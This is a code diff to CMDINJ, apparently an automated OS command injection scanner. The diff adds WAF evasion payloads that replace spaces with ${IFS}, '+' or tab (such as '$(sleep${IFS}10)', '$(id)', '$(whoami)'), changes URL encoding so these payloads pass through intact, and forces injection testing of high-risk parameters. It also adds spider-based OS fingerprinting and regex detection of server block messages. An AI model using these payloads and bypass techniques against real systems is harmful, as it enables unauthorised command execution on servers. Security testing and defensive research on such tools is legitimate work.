@@ -309,17 +309,64 @@ def run_external_spider(target, args):
         except: pass
 
         raw_eps = []
-        for _sj_ep in data.get("endpoints", []):
-            _sj_url = _sj_ep["url"]
-            _sj_methods = _sj_ep.get("methods", ["GET"])
-            _sj_params_map = _sj_ep.get("params", {})
+        # ── Parse spider JSON ────────────────────────────────────────
+        # Spider export format (json):
+        #   data = {"meta":{...}, "endpoints":[...], "agent_targets":[...], ...}
+        # Each endpoint has:
+        #   "params"        → flat list of param names  ["q","host",...]
+        #   "params_detail" → bucket dict {"query":[...],"form":[...],...}
+        #   "method"        → single string "GET" (not "methods" list)
+        #   "observed_values" → {"param": "seen_value", ...}
+        #   "confidence"    → label string "CONFIRMED"/"HIGH"/...
+        # Prefer agent_targets when available (pre-filtered, scored).
+        if isinstance(data, dict):
+            _ep_list = data.get("agent_targets") or data.get("endpoints", [])
+        else:
+            _ep_list = data  # bare list fallback
+
+        for _sj_ep in _ep_list:
+            _sj_url = _sj_ep.get("url")
+            if not _sj_url:
+                continue
+
+            # Method: spider uses "method" (string), not "methods" (list)
+            _sj_method_raw = _sj_ep.get("method") or _sj_ep.get("methods")
+            if isinstance(_sj_method_raw, list):
+                _sj_methods = _sj_method_raw
+            elif isinstance(_sj_method_raw, str):
+                _sj_methods = [_sj_method_raw]
+            else:
+                _sj_methods = ["GET"]
+
+            # Params: "params" may be a flat list or a bucket dict.
+            # The bucket dict lives in "params_detail".
+            _sj_params_raw = _sj_ep.get("params", [])
+            _sj_params_detail = _sj_ep.get("params_detail", {})
             _sj_obs_values = _sj_ep.get("observed_values") or {}
             _sj_sig = (_sj_ep.get("baseline") or {}).get("hash")
-            
+
             params = {}
             priority_params = set()
-            for bucket in ["query", "form", "js", "openapi", "runtime"]:
-                for p in _sj_params_map.get(bucket, []):
+
+            # Strategy 1: extract from bucket dict (params_detail)
+            if isinstance(_sj_params_detail, dict) and _sj_params_detail:
+                for bucket in ["query", "form", "js", "openapi", "runtime"]:
+                    for p in _sj_params_detail.get(bucket, []):
+                        val = _sj_obs_values.get(p)
+                        if val is None:
+                            if any(x in p.lower() for x in ["id", "pk", "uid"]): val = "1"
+                            elif "ip" in p.lower() or "host" in p.lower(): val = "127.0.0.1"
+                            elif "user" in p.lower(): val = "admin"
+                            elif "mail" in p.lower(): val = "root@localhost"
+                            else: val = "test"
+                        params[p] = str(val)
+                        priority_params.add(p)
+
+            # Strategy 2: if params_detail was empty, use flat params list
+            if not params and isinstance(_sj_params_raw, list):
+                for p in _sj_params_raw:
+                    if not isinstance(p, str):
+                        continue
                     val = _sj_obs_values.get(p)
                     if val is None:
                         if any(x in p.lower() for x in ["id", "pk", "uid"]): val = "1"
@@ -329,8 +376,23 @@ def run_external_spider(target, args):
                         else: val = "test"
                     params[p] = str(val)
                     priority_params.add(p)
-            
-            _confirmed = bool(_sj_ep.get("confidence_label") == "CONFIRMED" or _sj_ep.get("confirmed"))
+
+            # Strategy 3: if params was a bucket dict itself (legacy format)
+            if not params and isinstance(_sj_params_raw, dict):
+                for bucket in ["query", "form", "js", "openapi", "runtime"]:
+                    for p in _sj_params_raw.get(bucket, []):
+                        val = _sj_obs_values.get(p)
+                        if val is None:
+                            if any(x in p.lower() for x in ["id", "pk", "uid"]): val = "1"
+                            elif "ip" in p.lower() or "host" in p.lower(): val = "127.0.0.1"
+                            elif "user" in p.lower(): val = "admin"
+                            elif "mail" in p.lower(): val = "root@localhost"
+                            else: val = "test"
+                        params[p] = str(val)
+                        priority_params.add(p)
+
+            _conf_label = _sj_ep.get("confidence_label") or _sj_ep.get("confidence") or ""
+            _confirmed = bool(_conf_label == "CONFIRMED" or _sj_ep.get("confirmed"))
 
             for m in _sj_methods:
                 raw_eps.append({
@@ -343,21 +405,30 @@ def run_external_spider(target, args):
                     "confirmed":         _confirmed,
                     "parameter_sensitive": bool(_sj_ep.get("parameter_sensitive")),
                     "response_sig":      _sj_sig,
-                    "discovered_via":    _sj_ep.get("discovered_via") or None,
+                    "discovered_via":    _sj_ep.get("discovered_via") or _sj_ep.get("source") or None,
                 })
 
         animator.stop()
+        # Extract spider metadata for downstream use (OS fingerprinting, etc.)
+        _spider_meta = {}
+        if isinstance(data, dict):
+            _spider_meta = {
+                "tech_stack": data.get("tech_stack", []),
+                "whatweb_data": data.get("whatweb_data") or {},
+                "target_response_headers": data.get("target_response_headers") or {},
+                "summary": data.get("summary") or {},
+            }
         if raw_eps:
             _has_params = sum(1 for e in raw_eps if e.get("params"))
             tprint(f"  {ok(f'Reconnaissance complete: {color(len(raw_eps), C.W, C.B)} endpoints identified, {_has_params} with parameters')}")
         else:
             tprint(f"  {warn('Reconnaissance complete: bare endpoints only. No testable parameters found.')}")
-        return raw_eps
+        return raw_eps, _spider_meta
 
     except Exception as e:
         animator.stop()
         tprint(f"  {err(f'Integration error: {e}')}")
-        return []
+        return [], {}
 
 _print_lock = threading.Lock()
 def tprint(*a, **kw):
@@ -365,12 +436,7 @@ def tprint(*a, **kw):
         print(*a, **kw)
 
 def section(title):
-    import shutil
-    w = shutil.get_terminal_size((80, 20)).columns
-    line = color("─" * w, C.RD)
-    tprint(f"\n{line}")
-    tprint(f"  {color(title.upper(), C.W, C.B)}")
-    tprint(f"{line}")
+    tprint(f"\n  {color(title.upper(), C.W, C.B)}\n")
 
 def rule(char="─", style=C.RD):
     import shutil
@@ -576,11 +642,25 @@ PAYLOADS = [
     ("|sleep 10",                        "Pipe sleep 10s",         "time",             True,  "linux"),
     ("$(sleep 10)",                      "Subshell sleep 10s",     "time",             True,  "linux"),
     ("||sleep 10",                       "OR sleep 10s",           "time",             True,  "linux"),
+    (";sleep${IFS}10",                   "Sleep 10s (IFS)",        "time",             True,  "linux"),
+    ("&&sleep${IFS}10",                  "AND sleep 10s (IFS)",    "time",             True,  "linux"),
+    ("|sleep${IFS}10",                   "Pipe sleep 10s (IFS)",   "time",             True,  "linux"),
+    ("$(sleep${IFS}10)",                 "Subshell sleep 10s (IFS)","time",            True,  "linux"),
+    ("||sleep${IFS}10",                  "OR sleep 10s (IFS)",     "time",             True,  "linux"),
+    (";sleep+10",                        "Sleep 10s (plus)",       "time",             True,  "linux"),
+    ("&&sleep+10",                       "AND sleep 10s (plus)",   "time",             True,  "linux"),
+    ("|sleep+10",                        "Pipe sleep 10s (plus)",  "time",             True,  "linux"),
+    ("$(sleep+10)",                      "Subshell sleep 10s (plus)","time",           True,  "linux"),
+    ("||sleep+10",                       "OR sleep 10s (plus)",    "time",             True,  "linux"),
     # Short sleep: environments with strict execution timeouts (<10s cutoff)
     (";sleep 5",                         "Sleep 5s short",         "time",             True,  "linux"),
     ("&&sleep 5",                        "AND sleep 5s short",     "time",             True,  "linux"),
     ("|sleep 5",                         "Pipe sleep 5s short",    "time",             True,  "linux"),
     ("$(sleep 5)",                       "Subshell sleep 5s",      "time",             True,  "linux"),
+    (";sleep${IFS}5",                    "Sleep 5s (IFS)",         "time",             True,  "linux"),
+    ("$(sleep${IFS}5)",                  "Subshell sleep 5s (IFS)","time",             True,  "linux"),
+    (";sleep+5",                         "Sleep 5s (plus)",        "time",             True,  "linux"),
+    ("$(sleep+5)",                       "Subshell sleep 5s (plus)","time",            True,  "linux"),
     ("&ping -n 10 127.0.0.1",           "Win ping delay",         "time",             True,  "windows"),
     ("&timeout /t 10 /nobreak",         "Win timeout",            "time",             True,  "windows"),
     # ── BLIND — output redirection ───────────────────────────────────────────
@@ -746,7 +826,9 @@ class HTTPClient:
 
     def get(self, url, params=None):
         if params:
-            qs = urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
+            def safe_plus_quote(string, safe='', encoding=None, errors=None):
+                return urllib.parse.quote(string, safe=safe + '+', encoding=encoding, errors=errors)
+            qs = urllib.parse.urlencode(params, quote_via=safe_plus_quote)
             url = url + ("&" if "?" in url else "?") + qs
         resp = self._do(url, None, "GET", self.headers)
         if self._is_auth_redirect(resp) and self.re_auth():
@@ -761,7 +843,9 @@ class HTTPClient:
                 body = _j.dumps(data).encode()
                 hdrs = {**self.headers, "Content-Type": "application/json"}
             else:
-                body = urllib.parse.urlencode(data).encode()
+                def safe_plus_quote(string, safe='', encoding=None, errors=None):
+                    return urllib.parse.quote(string, safe=safe + '+', encoding=encoding, errors=errors)
+                body = urllib.parse.urlencode(data, quote_via=safe_plus_quote).encode()
                 hdrs = {**self.headers, "Content-Type": "application/x-www-form-urlencoded"}
         else:
             body, hdrs = None, self.headers
@@ -790,7 +874,7 @@ class HTTPClient:
                 elapsed = time.time() - t0
                 text = r.read(512 * 1024).decode("utf-8", errors="replace")
                 return {"ok": True, "status": r.status, "body": text,
-                        "elapsed": elapsed, "url": url,
+                        "elapsed": elapsed, "url": url, "final_url": r.url,
                         "headers": dict(r.headers), "error": None}
         except urllib.error.HTTPError as e:
             elapsed = time.time() - t0
@@ -910,9 +994,10 @@ class WAFDetector:
 
 
 class OSFingerprinter:
-    def __init__(self, base_url, client):
+    def __init__(self, base_url, client, spider_data=None):
         self.url = base_url
         self.client = client
+        self.spider_data = spider_data or {}
 
     def fingerprint(self):
         section("PHASE 2/4 — ENVIRONMENTAL SIGNAL (OS)")
@@ -950,6 +1035,44 @@ class OSFingerprinter:
         ]:
             if re.search(sig, body):
                 score[os_t] += pts; evidence.append(f"Body: {sig}")
+
+        # ── Spider tech stack boost ────────────────────────────────────
+        # Use spider's WhatWeb/tech_stack data for higher-confidence OS detection.
+        _sp = self.spider_data
+        _sp_tech = _sp.get("tech_stack", [])
+        _sp_whatweb = _sp.get("whatweb_data") or {}
+        _sp_headers = _sp.get("target_response_headers") or {}
+
+        # Tech stack entries (spider already identified these)
+        _tech_str = " ".join(str(t) for t in _sp_tech).lower()
+        if re.search(r"ubuntu|debian|centos|rhel|fedora|alpine|linux", _tech_str):
+            score["linux"] += 4; evidence.append(f"Spider tech: {[t for t in _sp_tech if re.search(r'ubuntu|debian|centos|rhel|fedora|alpine|linux', str(t).lower())]!r}")
+        if re.search(r"windows|iis|asp\.net", _tech_str):
+            score["windows"] += 4; evidence.append(f"Spider tech: Windows stack")
+
+        # WhatWeb server string (spider's WhatWeb scan output)
+        _ww_server = str(_sp_whatweb.get("server", "")).lower()
+        if _ww_server and not server:
+            if any(x in _ww_server for x in ["apache", "nginx", "lighttpd"]):
+                score["linux"] += 3; evidence.append(f"WhatWeb Server: {_sp_whatweb.get('server','')}")
+            elif any(x in _ww_server for x in ["iis", "microsoft"]):
+                score["windows"] += 3; evidence.append(f"WhatWeb Server: {_sp_whatweb.get('server','')}")
+        # WhatWeb OS string
+        _ww_os = str(_sp_whatweb.get("os", "")).lower()
+        if re.search(r"ubuntu|debian|centos|linux|rhel", _ww_os):
+            score["linux"] += 3; evidence.append(f"WhatWeb OS: {_sp_whatweb.get('os','')}")
+        elif re.search(r"windows", _ww_os):
+            score["windows"] += 3; evidence.append(f"WhatWeb OS: {_sp_whatweb.get('os','')}")
+
+        # Spider response headers (may have server header the direct request didn't)
+        _sp_srv = str(_sp_headers.get("server", _sp_headers.get("Server", ""))).lower()
+        if _sp_srv and not server:
+            if any(x in _sp_srv for x in ["apache", "nginx", "lighttpd"]):
+                score["linux"] += 2; evidence.append(f"Spider headers: {_sp_srv}")
+            elif any(x in _sp_srv for x in ["iis", "microsoft"]):
+                score["windows"] += 2; evidence.append(f"Spider headers: {_sp_srv}")
+            if "ubuntu" in _sp_srv:
+                score["linux"] += 2; evidence.append("Spider headers: Ubuntu")
 
         if score["linux"] == score["windows"] == 0:
             result, confidence = "linux", "low"
@@ -1901,6 +2024,16 @@ class AdaptiveBypass:
         add("%0aid%0a",                  "%0aid%0a",             "5A URL-NL id",      "system:linux_id",  False, "linux")
         add("%0asleep%2010%0a",          "%0asleep%2010%0a",     "5A URL-NL sleep",   "time",             True,  "linux")
 
+        # Subshell space-bypass variants (no space, no semicolons, no pipes)
+        add(f"$(echo${{{' '}IFS}}{tok})", f"$(echo${{IFS}}TOKEN)", "5A subshell IFS echo", "echo",             False, "linux")
+        add(f"$(echo+{tok})",             f"$(echo+TOKEN)",        "5A subshell plus echo", "echo",            False, "linux")
+        add(f"$(echo\t{tok})",            f"$(echo\tTOKEN)",       "5A subshell tab echo",  "echo",            False, "linux")
+        add("$(sleep${IFS}10)",            "$(sleep${IFS}10)",       "5A subshell IFS sleep", "time",            True,  "linux")
+        add("$(sleep+10)",                 "$(sleep+10)",            "5A subshell plus sleep","time",            True,  "linux")
+        add("$(sleep\t10)",                "$(sleep\t10)",           "5A subshell tab sleep", "time",            True,  "linux")
+        add("$(id)",                       "$(id)",                  "5A subshell id",        "system:linux_id",  False, "linux")
+        add("$(whoami)",                   "$(whoami)",              "5A subshell whoami",    "system:linux_user",False, "linux")
+
         # ─── 5B: Whole-value Base64 (entire param = b64 of shell cmd) ────
         # These are added via whole_value_b64_payloads() and handled in
         # _run_adaptive_tier directly with the statistical timing engine.
@@ -2817,6 +2950,9 @@ class Injector:
         # ever falls back to plain-text append when replace-mode is required.
         self._param_enc_state: dict = {}
         self._last_response_bodies: list = []
+        # Track params where filtering/blocking was already reported
+        # to avoid spamming the same message for every payload.
+        self._filter_alerted: set = set()
         # Paths extracted from injection responses — drained by run() after each endpoint
         self._late_discovered_paths: set = set()
         self._current_param_baseline: tuple = (None, None)
@@ -3303,6 +3439,48 @@ class Injector:
                 if _rh == _pb[0] and len(_rb) == _pb[1]:
                     vdim(f"  [{param}] time-skip: response identical to baseline (param not reflected)")
                     return False, "", pl, resp["status"], resp["elapsed"], 0
+
+        # ── Real-time filter/block detection ─────────────────────────────
+        # Show the operator when the server is actively filtering input.
+        # Only prints once per (endpoint-url, param) to avoid spam.
+        _resp_body_str = resp.get("body", "") or ""
+        _alert_key = (endpoint.get("url", ""), param)
+        if _alert_key not in self._filter_alerted and _resp_body_str:
+            _err_class = AdaptiveBypass.classify_error(_resp_body_str)
+            _filter_msg = None
+            if _err_class == "waf_block":
+                _filter_msg = "WAF/firewall block detected"
+            elif _err_class == "input_validation":
+                _filter_msg = "Input filtering detected (special chars rejected)"
+            elif _err_class == "access_denied":
+                _filter_msg = "Access denied / auth gate"
+            elif resp.get("status") in (403, 406, 418, 451):
+                # HTTP status codes commonly used by WAFs / custom filters
+                _filter_msg = f"Server rejected payload (HTTP {resp['status']})"
+            else:
+                # Catch custom blocking messages like "Attempt hacking!"
+                _custom_block = re.search(
+                    r"(?:attempt(?:ing)?\s+hack|hack(?:ing)?\s+attempt"
+                    r"|hacking\s+detected|malicious\s+input"
+                    r"|suspicious\s+(?:input|request|activity)"
+                    r"|injection\s+(?:attempt|detected)"
+                    r"|attack\s+(?:attempt|detected)"
+                    r"|input\s+(?:rejected|blocked|denied|sanitized)"
+                    r"|request\s+(?:rejected|blocked|denied)"
+                    r"|payload\s+(?:rejected|blocked|denied)"
+                    r"|not\s+allowed|illegal\s+(?:input|request))",
+                    _resp_body_str[:1500], re.I
+                )
+                if _custom_block:
+                    _filter_msg = _custom_block.group(0).strip()
+            if _filter_msg:
+                self._filter_alerted.add(_alert_key)
+                sys.stdout.write("\r" + " " * 80 + "\r")
+                tprint(f"  {label('FILTER', f'{color(param, C.W)} → {_filter_msg}', C.O)}")
+                # Also show the actual server response snippet for context
+                _block_snip = _resp_body_str.strip()[:120].replace('\n', ' ').replace('\r', '')
+                if _block_snip:
+                    tprint(f"           {color(_block_snip, C.DIM)}")
 
         # Verbose: show payload being tested
         _pl_preview = pl[:80] + ('...' if len(pl) > 80 else '')
@@ -5053,6 +5231,28 @@ class Injector:
                             or "typeerror" in _bb_lower or "internal server error" in _bb_lower):
                         _skip_upfront = True
 
+                # ── Skip upfront probe for high-confidence params ──────────
+                # Spider-confirmed params, high-risk param names (ip, cmd,
+                # host, exec...), confirmed endpoints, and redirect-based
+                # responses must NEVER be skipped by the static check —
+                # the server may process the value on a different page
+                # (redirect to result.php/ping.php) making the form page
+                # appear "static" even though injection executes server-side.
+                if not _skip_upfront:
+                    _ep_priority = set(endpoint.get("priority_params") or [])
+                    _ep_confirmed = endpoint.get("confirmed", False)
+                    _baseline_redirected = (_baseline_resp or {}).get("final_url", "") != (_baseline_resp or {}).get("url", "")
+                    if (param in _ep_priority
+                            or risk_score(param) >= 2
+                            or _ep_confirmed
+                            or _baseline_redirected):
+                        _skip_upfront = True
+                        vdim(f"  [{param}] upfront probe bypassed — "
+                             f"{'spider-confirmed' if param in _ep_priority else ''}"
+                             f"{'high-risk name' if risk_score(param) >= 2 else ''}"
+                             f"{'confirmed endpoint' if _ep_confirmed else ''}"
+                             f"{'redirect-based' if _baseline_redirected else ''}")
+
                 _probe_static = 0
                 if not _skip_upfront:
                     for _upv in ("hh_probe_X1", "hh_probe_X2"):
@@ -5285,7 +5485,11 @@ class Injector:
                         _bail_thresh = max(baseline_time * 1.5, _sleep_secs * 0.2)
                         if _att == 0 and _last_t < _bail_thresh:
                             vdim(f"  [{param}] fast-bail: {_last_t:.2f}s < {_bail_thresh:.2f}s — sep {_t2_sep!r} dead")
-                            _t2_dead_seps.add(_t2_sep)
+                            # Only mark separator as dead if the payload has no space-like characters.
+                            # If it does have space-like characters, the failure might be due to WAF space filtering,
+                            # so we must keep the separator family alive to let space-bypass variants run.
+                            if not any(x in pl for x in (" ", "\t", "%20", "+")):
+                                _t2_dead_seps.add(_t2_sep)
                             break
                         # Early exit: second sample also fast
                         if len(_samp) >= 2 and _last_t < baseline_time * 0.5:
@@ -6216,7 +6420,7 @@ def export_json(findings, file_reads, target_url, stats, path):
 
     report = {
         "tool":    "CMDINJ",
-        "version": "1.0.0",
+        "version": "1.0.1",
         "mode":    "autonomous_verified_spa_probe_adaptive_waf_decoded_blind_aware",
         "timestamp":       datetime.now().isoformat(),
         "target":          target_url,
@@ -6830,6 +7034,7 @@ Spider import mode (Agent 2 crawl JSON — skips built-in crawler):
 
     # Phase 1 — Endpoint discovery
     endpoints = []
+    _spider_meta = {}  # tech_stack/whatweb data from spider, used by OS fingerprinter
 
     if _import_file:
         # (existing --spider-json logic follows)
@@ -7047,6 +7252,14 @@ Spider import mode (Agent 2 crawl JSON — skips built-in crawler):
             sys.exit(1)
 
         endpoints = _sj_endpoints
+        # Extract spider metadata for downstream use (OS fingerprinting, etc.)
+        if isinstance(_sj_raw, dict):
+            _spider_meta = {
+                "tech_stack": _sj_raw.get("tech_stack", []),
+                "whatweb_data": _sj_raw.get("whatweb_data") or {},
+                "target_response_headers": _sj_raw.get("target_response_headers") or {},
+                "summary": _sj_raw.get("summary") or {},
+            }
         _k_priority = sum(1 for e in endpoints
                           if e.get("parameter_sensitive") or e.get("confirmed"))
         tprint(f"  {ok(f'Spider JSON loaded: {len(endpoints)} endpoints, '
@@ -7062,7 +7275,7 @@ Spider import mode (Agent 2 crawl JSON — skips built-in crawler):
     else:
         # ── Automatic External Recon ─────────────────────────────────────
         if target and not getattr(args, "no_spider", False):
-            endpoints = run_external_spider(target, args)
+            endpoints, _spider_meta = run_external_spider(target, args)
         
         # ── Fallback: Exit if discovery fails ────────────────────────────
         if not endpoints:
@@ -7190,7 +7403,7 @@ Spider import mode (Agent 2 crawl JSON — skips built-in crawler):
         tprint(f"  {color('KERNEL', C.R):<12} {color(os_target.upper(), C.W, C.B)}")
         tprint(f"  {color('FORCE', C.R):<12} {color('User specified override', C.DIM)}")
     else:
-        fp_obj = OSFingerprinter(target, client)
+        fp_obj = OSFingerprinter(target, client, spider_data=_spider_meta if '_spider_meta' in dir() else None)
         os_target, run_both = fp_obj.fingerprint()
 
     # ── Inst 7: WAF Detection Phase ─────────────────────────────────────────
